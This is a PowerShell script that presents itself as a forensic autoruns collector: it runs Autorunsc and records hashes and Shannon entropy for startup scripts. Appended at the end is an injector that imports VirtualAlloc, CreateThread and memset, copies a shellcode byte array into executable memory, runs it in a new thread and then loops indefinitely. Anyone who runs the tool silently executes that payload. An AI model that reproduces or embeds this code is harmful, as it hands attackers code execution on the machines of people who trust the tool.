


function Compute-FileHash {
Param(
    [Parameter(Mandatory = $true, Position=1)]
    [string]$FilePath,
    [ValidateSet("MD5","SHA1","SHA256","SHA384","SHA512","RIPEMD160")]
    [string]$HashType = "MD5"
)
    
    switch ( $HashType.ToUpper() )
    {
        "MD5"       { $hash = [System.Security.Cryptography.MD5]::Create() }
        "SHA1"      { $hash = [System.Security.Cryptography.SHA1]::Create() }
        "SHA256"    { $hash = [System.Security.Cryptography.SHA256]::Create() }
        "SHA384"    { $hash = [System.Security.Cryptography.SHA384]::Create() }
        "SHA512"    { $hash = [System.Security.Cryptography.SHA512]::Create() }
        "RIPEMD160" { $hash = [System.Security.Cryptography.RIPEMD160]::Create() }
        default     { "Invalid hash type selected." }
    }

    if (Test-Path $FilePath) {
        $File = Get-ChildItem -Force $FilePath
        $fileData = [System.IO.File]::ReadAllBytes($File.FullName)
        $HashBytes = $hash.ComputeHash($fileData)
        $PaddedHex = ""

        foreach($Byte in $HashBytes) {
            $ByteInHex = [String]::Format("{0:X}", $Byte)
            $PaddedHex += $ByteInHex.PadLeft(2,"0")
        }
        $PaddedHex
        $File.LastWriteTimeUtc
        $File.Length
        
    } else {
        "${FilePath} is locked or could not be found."
        "${FilePath} is locked or could not be not found."
        Write-Error -Category InvalidArgument -Message ("{0} is locked or could not be found." -f $FilePath)
    }
}

function GetShannonEntropy {
Param(
    [Parameter(Mandatory=$True,Position=0)]
        [string]$FilePath
)
    $fileEntropy = 0.0
    $FrequencyTable = @{}
    $ByteArrayLength = 0
            
    if(Test-Path $FilePath) {
        $file = (ls $FilePath)
        Try {
            $fileBytes = [System.IO.File]::ReadAllBytes($file.FullName)
        } Catch {
            Write-Error -Message ("Caught {0}." -f $_)
        }

        foreach($fileByte in $fileBytes) {
            $FrequencyTable[$fileByte]++
            $ByteArrayLength++
        }

        $byteMax = 255
        for($byte = 0; $byte -le $byteMax; $byte++) {
            $byteProb = ([double]$FrequencyTable[[byte]$byte])/$ByteArrayLength
            if ($byteProb -gt 0) {
                $fileEntropy += -$byteProb * [Math]::Log($byteProb, 2.0)
            }
        }
        $fileEntropy
        
    } else {
        "${FilePath} is locked or could not be found. Could not calculate entropy."
        Write-Error -Category InvalidArgument -Message ("{0} is locked or could not be found." -f $FilePath)
    }
}

if (Test-Path "$env:SystemRoot\Autorunsc.exe") {
    
    $fileRegex = New-Object System.Text.RegularExpressions.Regex "(([a-zA-Z]:|\\\\\w[ \w\.]*)(\\\w[- \w\.\\\{\}]*|\\%[ \w\.]+%+)+|%[ \w\.]+%(\\\w[ \w\.]*|\\%[ \w\.]+%+)*)"
    & $env:SystemRoot\Autorunsc.exe /accepteula -a * -c -h -s '*' -nobanner 2> $null | ConvertFrom-Csv | ForEach-Object {
        $_ | Add-Member NoteProperty ScriptMD5 $null
        $_ | Add-Member NoteProperty ScriptModTimeUTC $null
        $_ | Add-Member NoteProperty ShannonEntropy $null
        $_ | Add-Member NoteProperty ScriptLength $null

        if ($_."Image Path") {
            $_.ShannonEntropy = GetShannonEntropy $_."Image Path"
        }

        $fileMatches = $False
        if (($_."Image Path").ToLower() -match "\.bat|\.ps1|\.vbs") {
            $fileMatches = $fileRegex.Matches($_."Image Path")
        } elseif (($_."Launch String").ToLower() -match "\.bat|\.ps1|\.vbs") {
            $fileMatches = $fileRegex.Matches($_."Launch String")
        }

        if ($fileMatches) {
            for($i = 0; $i -lt $fileMatches.count; $i++) {
                $file = $fileMatches[$i].value
                if ($file -match "\.bat|\.ps1|\.vbs") {
                    if ($file -match "%userdnsdomain%") {
                        $scriptPath = "\\" + [System.Environment]::ExpandEnvironmentVariables($file)
                    } elseif ($file -match "%") {
                        $scriptPath = [System.Environment]::ExpandEnvironmentVariables($file)
                    } else {
                        $scriptPath = $file
                    }
                }
                $scriptPath = $scriptPath.Trim()
                $_.ScriptMD5,$_.ScriptModTimeUTC,$_.ScriptLength = Compute-FileHash $scriptPath
                $scriptPath = $null
            }
        }
        $_
    }
} else {
    Write-Error "Autorunsc.exe not found in $env:SystemRoot."
}

$Udz = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $Udz -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0x77,0xd6,0xfb,0xa5,0xdb,0xd7,0xd9,0x74,0x24,0xf4,0x5f,0x33,0xc9,0xb1,0x47,0x83,0xc7,0x04,0x31,0x57,0x0f,0x03,0x57,0x78,0x34,0x0e,0x59,0x6e,0x3a,0xf1,0xa2,0x6e,0x5b,0x7b,0x47,0x5f,0x5b,0x1f,0x03,0xcf,0x6b,0x6b,0x41,0xe3,0x00,0x39,0x72,0x70,0x64,0x96,0x75,0x31,0xc3,0xc0,0xb8,0xc2,0x78,0x30,0xda,0x40,0x83,0x65,0x3c,0x79,0x4c,0x78,0x3d,0xbe,0xb1,0x71,0x6f,0x17,0xbd,0x24,0x80,0x1c,0x8b,0xf4,0x2b,0x6e,0x1d,0x7d,0xcf,0x26,0x1c,0xac,0x5e,0x3d,0x47,0x6e,0x60,0x92,0xf3,0x27,0x7a,0xf7,0x3e,0xf1,0xf1,0xc3,0xb5,0x00,0xd0,0x1a,0x35,0xae,0x1d,0x93,0xc4,0xae,0x5a,0x13,0x37,0xc5,0x92,0x60,0xca,0xde,0x60,0x1b,0x10,0x6a,0x73,0xbb,0xd3,0xcc,0x5f,0x3a,0x37,0x8a,0x14,0x30,0xfc,0xd8,0x73,0x54,0x03,0x0c,0x08,0x60,0x88,0xb3,0xdf,0xe1,0xca,0x97,0xfb,0xaa,0x89,0xb6,0x5a,0x16,0x7f,0xc6,0xbd,0xf9,0x20,0x62,0xb5,0x17,0x34,0x1f,0x94,0x7f,0xf9,0x12,0x27,0x7f,0x95,0x25,0x54,0x4d,0x3a,0x9e,0xf2,0xfd,0xb3,0x38,0x04,0x02,0xee,0xfd,0x9a,0xfd,0x11,0xfe,0xb3,0x39,0x45,0xae,0xab,0xe8,0xe6,0x25,0x2c,0x15,0x33,0xd3,0x29,0x81,0xe2,0x65,0x6f,0x48,0x73,0x64,0x8f,0x7b,0xdf,0xe1,0x69,0x2b,0x8f,0xa1,0x25,0x8b,0x7f,0x02,0x96,0x63,0x6a,0x8d,0xc9,0x93,0x95,0x47,0x62,0x39,0x7a,0x3e,0xda,0xd5,0xe3,0x1b,0x90,0x44,0xeb,0xb1,0xdc,0x46,0x67,0x36,0x20,0x08,0x80,0x33,0x32,0xfc,0x60,0x0e,0x68,0xaa,0x7f,0xa4,0x07,0x52,0xea,0x43,0x8e,0x05,0x82,0x49,0xf7,0x61,0x0d,0xb1,0xd2,0xfa,0x84,0x27,0x9d,0x94,0xe8,0xa7,0x1d,0x64,0xbf,0xad,0x1d,0x0c,0x67,0x96,0x4d,0x29,0x68,0x03,0xe2,0xe2,0xfd,0xac,0x53,0x57,0x55,0xc5,0x59,0x8e,0x91,0x4a,0xa1,0xe5,0x23,0xb6,0x74,0xc3,0x51,0xd6,0x44;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$uUZ=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($uUZ.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$uUZ,0,0,0);for (;;){Start-sleep 60};

